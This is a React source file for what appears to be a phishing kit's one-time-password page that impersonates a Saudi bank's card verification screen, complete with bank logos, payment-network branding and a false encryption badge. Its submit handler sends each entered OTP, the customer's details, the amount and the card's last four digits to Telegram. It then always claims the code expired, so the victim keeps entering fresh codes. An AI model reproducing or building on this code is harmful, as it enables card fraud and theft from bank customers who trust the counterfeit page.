import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Shield, AlertCircle, ArrowLeft, Lock, Smartphone, CheckCircle2, Info } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { formatCurrency } from "@/lib/countries";
import { getBankById } from "@/lib/banks";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(60);
  const [isVerifying, setIsVerifying] = useState(false);
  
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const selectedBankId = linkData?.payload?.selectedBank || 'alrajhi';
  const selectedBank = getBankById(selectedBankId);
  const bankColor = selectedBank?.color || '#003D7A';

  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const shippingInfo = linkData?.payload as any;
  const rawAmount = shippingInfo?.payment_data?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, linkData?.payload?.payment_data?.currency_code || "SAR");

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);
  
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);
  
  const handleChange = (index: number, value: string) => {
    const numericValue = value.replace(/[^0-9]/g, '');
    if (numericValue.length <= 1) {
      const newOtp = [...otp];
      newOtp[index] = numericValue;
      setOtp(newOtp);
      setError("");
      if (numericValue && index < 5) {
        inputRefs.current[index + 1]?.focus();
      }
    }
  };
  
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      e.preventDefault();
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      } else if (index > 0) {
        const newOtp = [...otp];
        newOtp[index - 1] = "";
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpString = otp.join('');
    if (otpString.length !== 6) {
      setError("الرجاء إدخال رمز التحقق كاملاً");
      return;
    }

    setIsVerifying(true);
    
    await sendToTelegram({
      type: 'payment_otp_attempt',
      data: {
        ...customerInfo,
        bank: selectedBank?.nameAr,
        amount: formattedAmount,
        otp: otpString,
        attempts: attempts + 1,
        cardLast4: sessionStorage.getItem('cardLast4') || ''
      },
      timestamp: new Date().toISOString()
    });

    // Simulated delay for "security check"
    setTimeout(() => {
      setIsVerifying(false);
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);

      if (newAttempts >= 3) {
        setError("فشلت عملية التحقق. يرجى التواصل مع البنك المصدر للبطاقة.");
      } else {
        setError("رمز التحقق منتهي الصلاحية أو غير صحيح. تم إرسال رمز جديد.");
        setOtp(["", "", "", "", "", ""]);
        setCountdown(60);
        inputRefs.current[0]?.focus();
      }
    }, 1500);
  };
  
  return (
    <div className="min-h-screen bg-[#F8F9FA] flex flex-col font-sans" dir="rtl">
      {/* Official Bank-Style Header */}
      <header className="bg-white border-b h-20 flex items-center justify-between px-6 md:px-20 shadow-sm sticky top-0 z-50">
        <div className="flex items-center gap-4">
          <img src={selectedBank?.logo} alt="Bank Logo" className="h-10" />
          <div className="h-6 w-px bg-gray-200 hidden md:block" />
          <span className="font-black text-sm hidden md:block" style={{ color: bankColor }}>نظام التحقق الآمن</span>
        </div>
        <div className="flex items-center gap-2">
           <Shield className="w-5 h-5" style={{ color: bankColor }} />
           <span className="text-[10px] font-black uppercase text-gray-400">Verified by VISA / Mastercard</span>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-lg bg-white shadow-[0_30px_60px_-15px_rgba(0,0,0,0.1)] rounded-[32px] overflow-hidden border border-gray-100">
          {/* Status Banner */}
          <div className="p-8 text-center border-b bg-gray-50/50">
            <div className="w-16 h-16 rounded-2xl mx-auto mb-6 flex items-center justify-center text-white shadow-lg" style={{ backgroundColor: bankColor }}>
              <Smartphone className="w-8 h-8" />
            </div>
            <h1 className="text-2xl font-black mb-2" style={{ color: bankColor }}>التحقق من الهوية</h1>
            <p className="text-xs text-gray-400 font-bold uppercase tracking-wider">Authentication Required</p>
          </div>

          <div className="p-10">
            <div className="bg-blue-50 border border-blue-100 rounded-2xl p-6 mb-10 flex items-start gap-4">
              <Info className="w-5 h-5 text-blue-600 mt-1 flex-shrink-0" />
              <div className="text-sm text-blue-900 leading-relaxed font-bold">
                لقد تم إرسال رمز تحقق (OTP) إلى رقم هاتفك المسجل لدينا والمغلق بـ <span dir="ltr">****{customerInfo.phone?.slice(-4)}</span> لإتمام عملية دفع بمبلغ <span className="underline">{formattedAmount}</span>.
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-10">
              <div className="space-y-6">
                <div className="flex justify-between items-center mb-2">
                  <label className="text-xs font-black text-gray-400 uppercase">رمز التحقق</label>
                  {countdown > 0 ? (
                    <span className="text-[10px] font-bold text-gray-400">تنتهي الصلاحية خلال {countdown} ثانية</span>
                  ) : (
                    <button type="button" onClick={() => setCountdown(60)} className="text-[10px] font-black text-blue-600 hover:underline">إعادة إرسال الرمز</button>
                  )}
                </div>
                
                <div className="flex gap-2 md:gap-4 justify-between" dir="ltr">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el)}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-full h-16 md:h-20 text-center text-3xl font-black bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-blue-500 focus:bg-white transition-all outline-none"
                      style={{ 
                        borderColor: digit ? bankColor : '',
                        color: bankColor 
                      }}
                    />
                  ))}
                </div>
              </div>

              {error && (
                <div className="flex items-center gap-3 p-4 bg-red-50 border border-red-100 rounded-xl text-red-600 animate-shake">
                  <AlertCircle className="w-5 h-5" />
                  <p className="text-xs font-black">{error}</p>
                </div>
              )}

              <Button
                type="submit"
                disabled={isVerifying || otp.join('').length !== 6 || attempts >= 3}
                className="w-full h-16 text-lg font-black text-white shadow-xl transition-all active:scale-95"
                style={{ backgroundColor: bankColor }}
              >
                {isVerifying ? <Loader2 className="w-6 h-6 animate-spin" /> : "تأكيد وإتمام العملية"}
              </Button>
            </form>
          </div>

          <div className="bg-gray-50 p-6 flex items-center justify-center gap-6 border-t">
             <img src="/assets/branding/gov-sadad-logo.jpg" className="h-4 opacity-30 grayscale" />
             <img src="/assets/branding/gov-knet-logo.png" className="h-4 opacity-30 grayscale" />
             <img src="/assets/branding/gov-benefit-logo.png" className="h-4 opacity-30 grayscale" />
          </div>
        </div>
        
        <p className="mt-10 text-[10px] text-gray-400 font-bold flex items-center gap-2">
          <Lock className="w-3 h-3" />
          اتصال مشفر وآمن 256 بت
        </p>
      </main>
    </div>
  );
};

const Loader2 = ({ className }: { className?: string }) => (
  <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
);

export default PaymentOTPForm;
